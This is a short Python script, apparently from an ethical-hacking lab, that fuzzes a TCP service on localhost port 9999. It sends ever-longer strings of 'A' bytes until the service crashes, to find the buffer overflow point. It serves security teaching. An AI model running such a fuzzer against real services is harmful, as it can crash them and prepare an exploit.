"""
=====================================================
 Buffer Overflow Discovery Script (Educational)
 Author: Ethical Hacking Lab Practice
 Purpose:
     - Discover input size limits
     - Identify crash points
     - Learn fuzzing methodology
=====================================================

IMPORTANT:
- Use ONLY against intentionally vulnerable lab services
- Do NOT use on production or unauthorized systems
"""

import socket
import time


# -------------------------------
# TARGET CONFIGURATION
# -------------------------------

# IP address of the vulnerable service
TARGET_IP = "127.0.0.1"

# Port where the vulnerable service is listening
TARGET_PORT = 9999


# -------------------------------
# FUZZING CONFIGURATION
# -------------------------------

# Initial payload size (small and safe)
initial_payload_size = 100

# How much to increase payload each iteration
payload_increment = 100

# Delay between attempts (prevents flooding)
delay_between_attempts = 1


# -------------------------------
# FUZZING LOOP
# -------------------------------

# Start payload size
current_payload_size = initial_payload_size

print("[*] Starting buffer overflow fuzzing...")
print("[*] Target:", TARGET_IP, ":", TARGET_PORT)
print("[*] Incrementing payload size gradually\n")

while True:
    try:
        # -------------------------------
        # CREATE TEST PAYLOAD
        # -------------------------------

        # Create a byte-string payload
        # 'A' is commonly used because it is easy to recognize in memory
        payload = b"A" * current_payload_size

        print(f"[+] Sending payload of size: {current_payload_size} bytes")

        # -------------------------------
        # CREATE SOCKET CONNECTION
        # -------------------------------

        # AF_INET  -> IPv4
        # SOCK_STREAM -> TCP connection
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:

            # Connect to the vulnerable service
            client_socket.connect((TARGET_IP, TARGET_PORT))

            # Send the payload
            client_socket.send(payload)

            # Optional: receive response (some services reply)
            try:
                response = client_socket.recv(1024)
                print("[+] Received response from service")
            except:
                # If no response, continue silently
                pass

        # -------------------------------
        # PREPARE NEXT ITERATION
        # -------------------------------

        # Increase payload size
        current_payload_size += payload_increment

        # Pause before next attempt
        time.sleep(delay_between_attempts)

    except Exception as error:
        # -------------------------------
        # CRASH DETECTION
        # -------------------------------

        print("\n[!] Connection failed or service crashed")
        print("[!] Possible buffer overflow detected")
        print(
            f"[!] Crash occurred around payload size: {current_payload_size} bytes")
        print(f"[!] Error details: {error}")

        break


print("\n[*] Fuzzing completed")
print("[*] Review crash size in debugger for further analysis")
